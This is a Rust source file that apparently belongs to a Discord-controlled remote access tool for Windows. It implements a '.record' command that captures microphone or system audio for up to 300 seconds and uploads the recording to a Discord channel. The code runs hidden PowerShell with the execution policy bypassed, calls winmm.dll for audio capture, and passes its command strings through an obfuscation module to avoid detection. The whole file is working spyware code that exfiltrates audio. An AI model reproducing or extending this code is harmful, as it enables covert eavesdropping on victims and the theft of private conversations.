use crate::commands::*;
use crate::log_debug;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use std::os::windows::process::CommandExt;
use std::sync::atomic::{AtomicBool, Ordering};

const CREATE_NO_WINDOW: u32 = 0x08000000;

static RECORDING_ACTIVE: AtomicBool = AtomicBool::new(false);

pub struct RecordCommand;

#[async_trait]
impl BotCommand for RecordCommand {
    fn name(&self) -> &str { "record" }
    fn description(&self) -> &str { "Record audio from microphone or system and send to Discord" }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".record <mic|system> <seconds>" }
    fn examples(&self) -> &'static [&'static str] {
        &[
            ".record mic 10",
            ".record system 30",
            ".record mic 60"
        ]
    }
    fn aliases(&self) -> &'static [&'static str] { &["rec", "audio"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let source = match args.next() {
            Some(s) => s.to_lowercase(),
            None => {
                http.create_message(msg.channel_id)
                    .content("**Usage**: `.record <mic|system> <seconds>`\n\n**Examples**:\n`.record mic 10` - Record 10 seconds from microphone\n`.record system 30` - Record 30 seconds of system audio")
                    .await?;
                return Ok(());
            }
        };

        let duration: u32 = match args.next().and_then(|d| d.parse().ok()) {
            Some(d) if d >= 1 && d <= 300 => d,
            Some(_) => {
                http.create_message(msg.channel_id)
                    .content("**Error**: Duration must be between 1 and 300 seconds")
                    .await?;
                return Ok(());
            }
            None => {
                http.create_message(msg.channel_id)
                    .content("**Error**: Please specify duration in seconds")
                    .await?;
                return Ok(());
            }
        };

        if RECORDING_ACTIVE.load(Ordering::SeqCst) {
            http.create_message(msg.channel_id)
                .content("**Error**: A recording is already in progress")
                .await?;
            return Ok(());
        }

        let is_mic = match source.as_str() {
            "mic" | "microphone" => true,
            "system" | "sys" | "desktop" | "loopback" => false,
            _ => {
                http.create_message(msg.channel_id)
                    .content("**Error**: Invalid source. Use `mic` or `system`")
                    .await?;
                return Ok(());
            }
        };

        let source_name = if is_mic { "Microphone" } else { "System Audio" };
        
        http.create_message(msg.channel_id)
            .content(&format!("🎙️ Recording {} for {} seconds...", source_name, duration))
            .await?;

        RECORDING_ACTIVE.store(true, Ordering::SeqCst);

        let http_clone = http.clone();
        let channel_id = msg.channel_id;

        tokio::spawn(async move {
            let result = if is_mic {
                Self::record_microphone(duration).await
            } else {
                Self::record_system_audio(duration).await
            };

            RECORDING_ACTIVE.store(false, Ordering::SeqCst);

            match result {
                Ok(audio_data) => {
                    let filename = format!(
                        "recording_{}_{}.wav",
                        if is_mic { "mic" } else { "system" },
                        chrono::Local::now().format("%Y%m%d_%H%M%S")
                    );

                    use twilight_model::http::attachment::Attachment;
                    let attachment = Attachment::from_bytes(filename.clone(), audio_data, 1);

                    if let Err(e) = http_clone
                        .create_message(channel_id)
                        .content(&format!("✅ Recording complete: `{}`", filename))
                        .attachments(&[attachment])
                        .await
                    {
                        log_debug!("Failed to send recording: {}", e);
                    }
                }
                Err(e) => {
                    log_debug!("Recording failed: {}", e);
                    let _ = http_clone
                        .create_message(channel_id)
                        .content(&format!("**Error**: Recording failed: {}", e))
                        .await;
                }
            }
        });

        Ok(())
    }
}

impl RecordCommand {
    async fn record_microphone(duration: u32) -> Result<Vec<u8>> {
        let temp_dir = std::env::temp_dir();
        let temp_file = temp_dir.join(format!("krec_{}.wav", std::process::id()));
        let temp_path = temp_file.to_string_lossy().to_string();

        // PowerShell script to record from microphone using NAudio-style approach
        let ps_script = format!(
            r#"
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class WaveRecorder {{
    [DllImport("winmm.dll")]
    public static extern int waveInGetNumDevs();
    
    [DllImport("winmm.dll")]
    public static extern int waveInOpen(out IntPtr phwi, int uDeviceID, ref WAVEFORMATEX lpFormat, IntPtr dwCallback, IntPtr dwInstance, int fdwOpen);
    
    [DllImport("winmm.dll")]
    public static extern int waveInPrepareHeader(IntPtr hwi, ref WAVEHDR lpWaveHdr, int uSize);
    
    [DllImport("winmm.dll")]
    public static extern int waveInUnprepareHeader(IntPtr hwi, ref WAVEHDR lpWaveHdr, int uSize);
    
    [DllImport("winmm.dll")]
    public static extern int waveInAddBuffer(IntPtr hwi, ref WAVEHDR lpWaveHdr, int uSize);
    
    [DllImport("winmm.dll")]
    public static extern int waveInStart(IntPtr hwi);
    
    [DllImport("winmm.dll")]
    public static extern int waveInStop(IntPtr hwi);
    
    [DllImport("winmm.dll")]
    public static extern int waveInClose(IntPtr hwi);
    
    [DllImport("winmm.dll")]
    public static extern int waveInReset(IntPtr hwi);

    [StructLayout(LayoutKind.Sequential)]
    public struct WAVEFORMATEX {{
        public ushort wFormatTag;
        public ushort nChannels;
        public uint nSamplesPerSec;
        public uint nAvgBytesPerSec;
        public ushort nBlockAlign;
        public ushort wBitsPerSample;
        public ushort cbSize;
    }}

    [StructLayout(LayoutKind.Sequential)]
    public struct WAVEHDR {{
        public IntPtr lpData;
        public uint dwBufferLength;
        public uint dwBytesRecorded;
        public IntPtr dwUser;
        public uint dwFlags;
        public uint dwLoops;
        public IntPtr lpNext;
        public IntPtr reserved;
    }}

    public const int WAVE_MAPPER = -1;
    public const int CALLBACK_NULL = 0;
    public const int WHDR_DONE = 0x00000001;
}}
'@

$outputFile = '{}'
$durationSec = {}

# Audio format: 16-bit, 44.1kHz, Mono
$format = New-Object WaveRecorder+WAVEFORMATEX
$format.wFormatTag = 1  # PCM
$format.nChannels = 1
$format.nSamplesPerSec = 44100
$format.wBitsPerSample = 16
$format.nBlockAlign = [uint16]($format.nChannels * $format.wBitsPerSample / 8)
$format.nAvgBytesPerSec = $format.nSamplesPerSec * $format.nBlockAlign
$format.cbSize = 0

$bufferSize = $format.nAvgBytesPerSec * $durationSec
$buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)

$hwi = [IntPtr]::Zero
$result = [WaveRecorder]::waveInOpen([ref]$hwi, [WaveRecorder]::WAVE_MAPPER, [ref]$format, [IntPtr]::Zero, [IntPtr]::Zero, [WaveRecorder]::CALLBACK_NULL)

if ($result -ne 0) {{
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
    throw "Failed to open audio device: $result"
}}

$header = New-Object WaveRecorder+WAVEHDR
$header.lpData = $buffer
$header.dwBufferLength = $bufferSize
$header.dwFlags = 0

[WaveRecorder]::waveInPrepareHeader($hwi, [ref]$header, [System.Runtime.InteropServices.Marshal]::SizeOf($header)) | Out-Null
[WaveRecorder]::waveInAddBuffer($hwi, [ref]$header, [System.Runtime.InteropServices.Marshal]::SizeOf($header)) | Out-Null
[WaveRecorder]::waveInStart($hwi) | Out-Null

Start-Sleep -Seconds $durationSec

[WaveRecorder]::waveInStop($hwi) | Out-Null
[WaveRecorder]::waveInReset($hwi) | Out-Null

# Wait for buffer
Start-Sleep -Milliseconds 100

$recordedBytes = $header.dwBytesRecorded
$audioData = New-Object byte[] $recordedBytes
[System.Runtime.InteropServices.Marshal]::Copy($buffer, $audioData, 0, $recordedBytes)

[WaveRecorder]::waveInUnprepareHeader($hwi, [ref]$header, [System.Runtime.InteropServices.Marshal]::SizeOf($header)) | Out-Null
[WaveRecorder]::waveInClose($hwi) | Out-Null
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)

# Write WAV file
$fs = [System.IO.File]::Create($outputFile)
$bw = New-Object System.IO.BinaryWriter($fs)

# RIFF header
$bw.Write([System.Text.Encoding]::ASCII.GetBytes("RIFF"))
$bw.Write([uint32]($recordedBytes + 36))
$bw.Write([System.Text.Encoding]::ASCII.GetBytes("WAVE"))

# fmt chunk
$bw.Write([System.Text.Encoding]::ASCII.GetBytes("fmt "))
$bw.Write([uint32]16)
$bw.Write([uint16]1)  # PCM
$bw.Write([uint16]$format.nChannels)
$bw.Write([uint32]$format.nSamplesPerSec)
$bw.Write([uint32]$format.nAvgBytesPerSec)
$bw.Write([uint16]$format.nBlockAlign)
$bw.Write([uint16]$format.wBitsPerSample)

# data chunk
$bw.Write([System.Text.Encoding]::ASCII.GetBytes("data"))
$bw.Write([uint32]$recordedBytes)
$bw.Write($audioData)

$bw.Close()
$fs.Close()
"#,
            temp_path.replace("'", "''"),
            duration
        );

        use crate::utils::obfuscate::{exe, powershell as ps};
        let output = std::process::Command::new(exe::powershell())
            .args(&[&ps::no_profile(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_script])
            .creation_flags(CREATE_NO_WINDOW)
            .output()?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!("Recording failed: {}", stderr);
        }

        // Read the recorded file
        let audio_data = tokio::fs::read(&temp_file).await?;
        
        // Clean up
        let _ = tokio::fs::remove_file(&temp_file).await;

        Ok(audio_data)
    }

    async fn record_system_audio(duration: u32) -> Result<Vec<u8>> {
        let temp_dir = std::env::temp_dir();
        let temp_file = temp_dir.join(format!("krec_sys_{}.wav", std::process::id()));
        let temp_path = temp_file.to_string_lossy().to_string();

        // Use ffmpeg if available, otherwise fall back to PowerShell with loopback
        let ps_script = format!(
            r#"
$outputFile = '{}'
$durationSec = {}

# Try to use ffmpeg for system audio capture (better quality)
$ffmpeg = Get-Command ffmpeg -ErrorAction SilentlyContinue
if ($ffmpeg) {{
    & ffmpeg -f dshow -i audio="Stereo Mix" -t $durationSec -y "$outputFile" 2>$null
    if (Test-Path $outputFile) {{ exit 0 }}
    
    # Try virtual audio cable
    & ffmpeg -f dshow -i audio="CABLE Output (VB-Audio Virtual Cable)" -t $durationSec -y "$outputFile" 2>$null
    if (Test-Path $outputFile) {{ exit 0 }}
}}

# Fallback: Use SoundRecorder if available (Windows built-in)
Add-Type -AssemblyName System.Speech
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class AudioLoopback {{
    [DllImport("winmm.dll", SetLastError = true)]
    public static extern uint mciSendString(string lpstrCommand, System.Text.StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);
}}
'@

# Use MCI to record
$alias = "recsound"
[AudioLoopback]::mciSendString("open new type waveaudio alias $alias", $null, 0, [IntPtr]::Zero)
[AudioLoopback]::mciSendString("set $alias time format milliseconds", $null, 0, [IntPtr]::Zero)
[AudioLoopback]::mciSendString("record $alias", $null, 0, [IntPtr]::Zero)

Start-Sleep -Seconds $durationSec

[AudioLoopback]::mciSendString("stop $alias", $null, 0, [IntPtr]::Zero)
[AudioLoopback]::mciSendString("save $alias `"$outputFile`"", $null, 0, [IntPtr]::Zero)
[AudioLoopback]::mciSendString("close $alias", $null, 0, [IntPtr]::Zero)
"#,
            temp_path.replace("'", "''").replace("`", "``"),
            duration
        );

        use crate::utils::obfuscate::{exe, powershell as ps};
        let output = std::process::Command::new(exe::powershell())
            .args(&[&ps::no_profile(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_script])
            .creation_flags(CREATE_NO_WINDOW)
            .output()?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            log_debug!("System audio recording stderr: {}", stderr);
        }

        // Check if file was created
        if !temp_file.exists() {
            anyhow::bail!("System audio recording requires 'Stereo Mix' to be enabled or ffmpeg installed");
        }

        // Read the recorded file
        let audio_data = tokio::fs::read(&temp_file).await?;
        
        // Clean up
        let _ = tokio::fs::remove_file(&temp_file).await;

        Ok(audio_data)
    }
}
